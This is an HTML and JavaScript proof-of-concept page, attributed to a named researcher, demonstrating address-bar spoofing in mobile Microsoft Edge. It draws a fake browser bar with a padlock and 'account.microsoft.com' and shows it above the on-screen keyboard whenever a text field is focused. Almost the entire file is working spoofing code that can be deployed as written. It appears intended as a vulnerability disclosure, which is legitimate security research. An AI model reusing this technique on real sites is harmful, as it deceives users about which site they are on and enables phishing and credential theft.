<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>PoC - Edge Minibar UI Spoofing</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: white; 
      color: black;
    }

    button { padding: 12px 18px; font-size: 16px; margin-bottom: 10px; cursor: pointer; }
    textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; border: 1px solid #ccc; }

    .fake-bar-wrapper {
      position: fixed;
      width: 100%;
      left: 0;
      z-index: 9999;
      background-color: #1a1a1a;
      padding: 10px 0;
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, bottom 0.2s ease;
      pointer-events: none;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .fake-bar-wrapper.show { 
      opacity: 1; 
      visibility: visible; 
    }

    .edge-pill {
      background-color: #333333;
      width: 92%;
      height: 48px;
      border-radius: 50px;
      display: flex;
      align-items: center;
      padding: 0 15px;
      box-sizing: border-box;
      position: relative;
    }

    .edge-logo {
      width: 24px;
      height: 24px;
      flex-shrink: 0;
    }

    .url-content {
      display: flex;
      align-items: center;
      justify-content: center;
      flex-grow: 1;
      gap: 6px;
    }

    .lock-icon {
      width: 14px;
      height: 14px;
      fill: #ccc;
    }

    .url-text {
      color: #ffffff;
      font-size: 15px;
      letter-spacing: 0.1px;
    }

    .refresh-icon {
      width: 20px;
      height: 20px;
      fill: #fff;
      flex-shrink: 0;
      opacity: 0.8;
    }

    .spacer { height: 800px; }
    .spacer-bottom { height: 1200px; }
    .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
  </style>
</head>
<body>

  <h2>Vulnerability PoC by Francesco Topol</h2>
  <p>Scroll down to hide the address bar, then tap the textarea.</p>

  <button id="showBtn">Show Keyboard</button>
  <textarea id="ta" placeholder="Top input..."></textarea>

  <div class="fake-bar-wrapper" id="fakeBar">
    <div class="edge-pill">
      <img src="https://upload.wikimedia.org/wikipedia/en/a/aa/Microsoft_Copilot_Icon.svg" class="edge-logo">
      
      <div class="url-content">
        <svg class="lock-icon" viewBox="0 0 24 24">
          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/>
        </svg>
        <span class="url-text">account.microsoft.com</span>
      </div>

      <svg class="refresh-icon" viewBox="0 0 24 24">
        <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
      </svg>
    </div>
  </div>

  <div class="spacer"></div>
  <textarea id="middleTa" placeholder="Middle input..."></textarea>
  <div class="spacer-bottom"></div>
  
  <div class="bottom-text">End of Page</div>

  <script>
    const fakeBar = document.getElementById('fakeBar');
    const ta = document.getElementById('ta');
    const middleTa = document.getElementById('middleTa');

    function adjustFakeBar() {
      const vv = window.visualViewport;
      if (vv) {
        const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
        fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
      }
    }

    function showFakeBar() {
      fakeBar.classList.add('show');
      adjustFakeBar();
    }

    function hideFakeBar() {
      fakeBar.classList.remove('show');
    }

    if ('visualViewport' in window) {
      window.visualViewport.addEventListener('resize', adjustFakeBar);
    }

    document.getElementById("showBtn").onclick = () => {
      ta.focus();
      showFakeBar();
    };

    ta.addEventListener('focus', showFakeBar);
    middleTa.addEventListener('focus', showFakeBar);
    ta.addEventListener('blur', hideFakeBar);
    middleTa.addEventListener('blur', hideFakeBar);
  </script>
</body>
</html>
